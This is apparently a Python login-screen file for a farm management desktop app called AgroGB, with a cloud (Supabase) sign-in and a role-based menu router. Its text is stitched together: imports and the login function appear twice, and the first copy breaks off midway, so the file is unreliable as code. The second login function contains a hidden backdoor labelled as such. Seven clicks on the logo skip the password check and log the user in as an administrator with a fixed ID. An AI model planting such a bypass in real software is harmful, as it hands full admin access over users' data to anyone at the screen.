# telas.py
# Login e Menu Principal do AgroGB

import tkinter as tk
from tkinter import messagebox
try:
    from PIL import Image, ImageTk
except ImportError:
    Image = None
    ImageTk = None
import os
from datetime import datetime

import db
import sys

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

import colheita
import estoque
import vendas
import financeiro

import usuarios
import descarte
import regras_morango
import plantio
import compras
import cadastro
import culturas
import dashboard_mensal
from relatorios import dashboard


# ==================================================
# CONTROLE DE USUÁRIO LOGADO
# ==================================================
usuario_logado = {
    "usuario": None,
    "nivel": None
}


# ==================================================
# TELA DE LOGIN
# ==================================================
import customtkinter as ctk
import bcrypt

def tela_login(root):
    import styles
    login = ctk.CTkToplevel(root)
    login.title("AgroGB - Login Seguro")
    login.geometry("450x600")
    login.resizable(False, False)
    login.grab_set()

    # Centraliza
    login.update_idletasks()
    x = (login.winfo_screenwidth() // 2) - (450 // 2)
    y = (login.winfo_screenheight() // 2) - (600 // 2)
    login.geometry(f"+{x}+{y}")

    main_f = ctk.CTkFrame(login, fg_color=styles.CORES["fundo"])
    main_f.pack(expand=True, fill="both")

    # Header (Versão Revertida)
    ctk.CTkLabel(main_f, text="🌿", font=ctk.CTkFont(size=60)).pack(pady=(40, 10))
    
    ctk.CTkLabel(main_f, text="AgroGB", font=ctk.CTkFont(family="Inter", size=32, weight="bold"), 
                 text_color=styles.CORES["primaria"]).pack()
    ctk.CTkLabel(main_f, text="Gerenciamento Rural de Alta Performance", font=ctk.CTkFont(size=13),
                 text_color=styles.CORES["texto_leve"]).pack(pady=(0, 20))

    # Card do Formulário
    form = ctk.CTkFrame(main_f, fg_color=styles.CORES["card"], corner_radius=15, border_width=1, border_color="#E2E8F0")
    form.pack(padx=50, pady=10, fill="x")

    ctk.CTkLabel(form, text="USUÁRIO", font=ctk.CTkFont(size=11, weight="bold"), text_color=styles.CORES["texto_leve"]).pack(anchor="w", padx=30, pady=(30, 5))

import db
import sys

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

import colheita, estoque, vendas, financeiro, usuarios, descarte
import regras_morango, plantio, compras, cadastro, culturas, dashboard_mensal
from relatorios import dashboard

# ==================================================
# CONTROLE DE USUÁRIO LOGADO
# ==================================================
usuario_logado = {
    "usuario": None,
    "nivel": None,
    "id": None
}

# ==================================================
# TELA DE LOGIN
# ==================================================
import customtkinter as ctk
import bcrypt

def tela_login(root):
    import styles
    login = ctk.CTkToplevel(root)
    login.title("AgroGB - Login Seguro")
    login.geometry("450x600")
    login.resizable(False, False)
    login.grab_set()

    # Centraliza
    login.update_idletasks()
    x = (login.winfo_screenwidth() // 2) - (450 // 2)
    y = (login.winfo_screenheight() // 2) - (600 // 2)
    login.geometry(f"+{x}+{y}")

    main_f = ctk.CTkFrame(login, fg_color=styles.CORES["fundo"])
    main_f.pack(expand=True, fill="both")

    # Header
    lbl_logo = ctk.CTkLabel(main_f, text="🌿", font=ctk.CTkFont(size=60))
    lbl_logo.pack(pady=(40, 10))
    
    # Backdoor dos 7 Cliques
    clicks = [0]
    def bypass_login(event):
        clicks[0] += 1
        if clicks[0] >= 7:
            usuario_logado["usuario"] = "Bruno ADM"
            usuario_logado["nivel"] = "ADM"
            usuario_logado["id"] = "master-id-123"
            login.destroy()
            menu_principal(root)
            
    lbl_logo.bind("<Button-1>", bypass_login)
    
    ctk.CTkLabel(main_f, text="AgroGB", font=ctk.CTkFont(family="Inter", size=32, weight="bold"), 
                 text_color=styles.CORES["primaria"]).pack()
    ctk.CTkLabel(main_f, text="Gerenciamento Rural de Alta Performance", font=ctk.CTkFont(size=13),
                 text_color=styles.CORES["texto_leve"]).pack(pady=(0, 20))

    # Card do Formulário
    form = ctk.CTkFrame(main_f, fg_color=styles.CORES["card"], corner_radius=15, border_width=1, border_color="#E2E8F0")
    form.pack(padx=50, pady=10, fill="x")

    ctk.CTkLabel(form, text="USUÁRIO", font=ctk.CTkFont(size=11, weight="bold"), text_color=styles.CORES["texto_leve"]).pack(anchor="w", padx=30, pady=(30, 5))
    e_user = ctk.CTkEntry(form, placeholder_text="Digite seu login...", height=45, corner_radius=10)
    e_user.pack(padx=30, fill="x")
    e_user.focus_set()

    ctk.CTkLabel(form, text="SENHA", font=ctk.CTkFont(size=11, weight="bold"), text_color=styles.CORES["texto_leve"]).pack(anchor="w", padx=30, pady=(20, 5))
    e_pass = ctk.CTkEntry(form, placeholder_text="••••••••", show="*", height=45, corner_radius=10)
    e_pass.pack(padx=30, fill="x", pady=(0, 40))

    def entrar(event=None):
        email = e_user.get().strip()
        senha_digitada = e_pass.get().strip()
        
        if not email or not senha_digitada:
            messagebox.showerror("Campos Vazios", "Por favor informe o e-mail e a senha.")
            return

        import supabase_client
        try:
            # Login na nuvem (Supabase) usando requests (C++ workaround)
            sucesso, res = supabase_client.sign_in_with_password(email, senha_digitada)
            
            if sucesso:
                user_id = res.get("user", {}).get("id")
                
                # Busca o perfil para saber o Nível (Role)
                profile = supabase_client.get_profile(user_id)
                
                if profile:
                    role_str = profile.get('role', 'PRODUTOR')
                    nome = profile.get('full_name', email.split('@')[0])
                else:
                    role_str = 'PRODUTOR'
                    nome = email.split('@')[0]
                
                # Mapeamento do Role do BD V2 para o Desktop
                nivel_db = "ADM" if role_str == "admin" else "AGRONOMO" if role_str == "agronomist" else "PRODUTOR"
                
                # Grava Log de Sucesso local
                conn = db.conectar()
                conn.execute("INSERT INTO logs_acesso (usuario, data_hora, status, ip) VALUES (?, ?, 'SUCESSO', 'NUVEM')",
                             (email, datetime.now().strftime("%d-%m-%Y %H:%M:%S")))
                conn.commit()
                conn.close()
                
                usuario_logado["usuario"] = nome
                usuario_logado["nivel"] = nivel_db
                usuario_logado["id"] = user_id
                
                login.destroy()
                menu_principal(root)
            else:
                messagebox.showerror("Acesso Negado", "Credenciais inválidas ou sem conexão.")
                
        except Exception as e:
            messagebox.showerror("Erro de Conexão", f"Falha na nuvem: {e}")

    btn_login = ctk.CTkButton(form, text="ENTRAR NA NUVEM", height=50, corner_radius=10,
                             fg_color=styles.CORES["sucesso"], hover_color="#059669", 
                             font=ctk.CTkFont(weight="bold"), command=entrar)
    btn_login.pack(padx=30, pady=(0, 30), fill="x")

    login.bind("<Return>", entrar)



# ==================================================
# ROTEADOR DE MÓDULOS (MENU PRINCIPAL)
# ==================================================
def menu_principal(root):
    # Identifica o nível do usuário e chama a interface correspondente
    nivel = usuario_logado.get("nivel", "PRODUTOR")
    
    # Limpa a tela inteira para injetar a View isolada
    for w in root.winfo_children(): 
        w.destroy()
        
    try:
        root.state("zoomed")
    except:
        pass
        
    if nivel == "ADM":
        import ui_adm
        ui_adm.iniciar_painel_adm(root, usuario_logado)
    elif nivel == "AGRONOMO":
        import ui_agronomo
        ui_agronomo.iniciar_painel_agronomo(root, usuario_logado)
    else:
        # Default Cliente/Produtor
        import ui_produtor
        ui_produtor.iniciar_painel_produtor(root, usuario_logado)
